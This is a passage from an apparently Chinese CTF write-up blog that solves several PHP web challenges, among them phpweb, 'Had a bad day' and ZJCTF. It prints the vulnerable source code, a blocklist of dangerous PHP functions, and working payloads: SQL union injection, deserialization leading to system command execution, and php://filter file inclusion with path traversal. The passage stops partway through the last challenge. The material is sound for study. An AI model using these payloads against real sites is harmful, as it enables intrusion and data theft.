<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,data,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure>

<p>username列返回<code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125; </code></p>
<p>属于是被序列化了，那应该还有我们应该知道的源代码没有找到<br>dirsearch扫一扫<br>扫出这么几个能用的文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/db.php<br>/error.php<br>/flag.php<br>/login.php<br>/robots.txt<br>/view.php<br></code></pre></td></tr></table></figure>
<p>进入&#x2F;robots.txt找到&#x2F;user.php.bak<br>下载<br>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">12</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;/var/www/html/flag.php&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<span class="hljs-comment">//初始化一个cURL会话</span><br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<span class="hljs-comment">//为给定的cURL会话句柄设置一个选项</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<span class="hljs-comment">//执行给定的cURL会话</span><br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<span class="hljs-comment">//获取一个cURL连接资源句柄的信息</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>需要了解的</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> get(<span class="hljs-variable">$url</span>)<br>   &#123;<br>       <span class="hljs-variable">$ch</span> = curl_init();<span class="hljs-regexp">//</span>初始化一个cURL会话<br><br>       curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<span class="hljs-regexp">//</span>为给定的cURL会话句柄设置一个选项<br>       curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>       <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<span class="hljs-regexp">//</span>执行给定的cURL会话<br>       <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<span class="hljs-regexp">//</span>获取一个cURL连接资源句柄的信息<br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>           return <span class="hljs-number">404</span>;<br>       &#125;<br>       curl_close(<span class="hljs-variable">$ch</span>);<br><br>       return <span class="hljs-variable">$output</span>;<br>   &#125;<br><br></code></pre></td></tr></table></figure>

<ul>
<li>curl_init ： 初始化一个cURL会话，供curl_setopt(), curl_exec()和curl_close() 函数使用。</li>
<li>curl_setopt ： 请求一个url。其中CURLOPT_URL表示需要获取的URL地址，后面就是跟上了它的值。</li>
<li>CURLOPT_RETURNTRANSFER 将curl_exec()获取的信息以文件流的形式返回，而不是直接输出</li>
<li>curl_exec，成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。</li>
<li>CURLINFO_HTTP_CODE ：最后一个收到的HTTP代码。<br>curl_getinfo：以字符串形式返回它的值，因为设置了CURLINFO_HTTP_CODE，所以是返回的状态码。</li>
</ul>
<p>如果状态码不是404，就返回exec的结果。<br>get函数在getBlogContents()里被调用，传参为blog<br>给参数赋个值，反序列化看看flag.php</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$a</span>=new UserInfo();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">age</span>=12;<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">blog</span>=<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;<br>echo serialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?no=-<span class="hljs-number">1</span> union <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">12</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;<br></code></pre></td></tr></table></figure>
<p><img src="/images/WLVRMOO2ZVHZ1IHR1E.png" srcset="/img/loading.gif" lazyload><br>查看源代码<br><img src="/images/FISBFG6M8XZVKJ8.png" srcset="/img/loading.gif" lazyload><br>base64解码就可得到flag了</p>
<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>页面一直在刷新，抓个包先<br><img src="/images/ZQSBGIA79FQDV2.png" srcset="/img/loading.gif" lazyload><br>POST检查前面是函数，后面是参数<br>这里eval(system(‘ls’))用不了了，应该是被过滤了<br>应该是用了call_user_func()函数，用file_get_contents看一下源代码</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">func</span>=file_get_contents&amp;p=index.php<br></code></pre></td></tr></table></figure>
<p>找到php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>过滤了很多函数，用反序列化试试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;ls&quot;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">func</span><span class="hljs-operator">=</span>unserialize<span class="hljs-variable">&amp;p</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:<span class="hljs-punctuation">&#123;</span>s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//bg.jpg index.php index.php</span><br><br><span class="hljs-attr">func</span><span class="hljs-operator">=</span>unserialize<span class="hljs-variable">&amp;p</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:<span class="hljs-punctuation">&#123;</span>s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span><span class="hljs-punctuation">;</span>s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br></code></pre></td></tr></table></figure>
<p>flag应该是藏到了更隐蔽的位置</p>
<p>用find命令全局查找<br>payload:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;find / -name flag*&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/XR86EVQQXJ4OGAGCIE6.png" srcset="/img/loading.gif" lazyload><br>&#x2F;tmp&#x2F;flagoefiu4r93是flag的正确位置<br>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">22</span>:<span class="hljs-string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br><span class="hljs-regexp">//</span>flag&#123;d9827631-f2f1-<span class="hljs-number">407</span>b-<span class="hljs-number">9</span>ee9-<span class="hljs-number">5</span>fc84da1246a&#125;<br></code></pre></td></tr></table></figure>
<p>用readfile也可以<br>payload:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>=readfile&amp;p=/tmp/flagoefiu4r93<br><br><span class="hljs-attribute">or</span><br><br><span class="hljs-attribute">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;/tmp/flagoefiu4r93&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;readfile&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>源代码没有透漏出什么有用的信息<br>随便进入一个选项<br>看了看url栏，?category&#x3D;woofers，应该存在sql注入<br><img src="/images/VR1N6OQCRZJXPPOO7AQX.png" srcset="/img/loading.gif" lazyload><br>报错信息提取到include，和加了.php后缀<br>include的话我们使用伪协议<br>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=index<br></code></pre></td></tr></table></figure>
<p>返回一大串base64编码解码后查看源码<br>源码中夹杂了php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>			<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;category&#x27;</span>];<br><br>			<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>			&#123;<br>				<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br>					<span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>				&#125;<br>				<span class="hljs-keyword">else</span>&#123;<br>					<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;<br>				&#125;<br>			&#125;<br>			<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><code>if(true||false||false)</code><br>返回的结果是true，也就是满足一个条件成立即可，我们现在要读取的是flag.php<br>使用相对路径<br>相对路径计算时中间目录不存在并不影响</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=woofers<span class="hljs-regexp">/../</span>flag<br><span class="hljs-regexp">//</span>PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7ZWE3NTMyYTktYTRjYS00MDA0LWIzOTEtZDAzZmY4Nzc3YmM0fQo/Pgo= <br></code></pre></td></tr></table></figure>
<p>解码后就能得到flag了</p>
<p>还可以利用php:&#x2F;&#x2F;filter伪协议可以套一层协议读取flag.php<br>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/i</span>ndex/resource=flag<br></code></pre></td></tr></table></figure>
<p>套一个字符index符合条件并且传入flag，读取flag.php<br>可以发现当php定位不到我们自己加的filter时会报warning<br>但并没有影响执行</p>
<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//next.php</span><br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>第一个if用data伪协议通过,flag被禁用了，那么读读注释里next.php 里的内容<br>payload:</p>
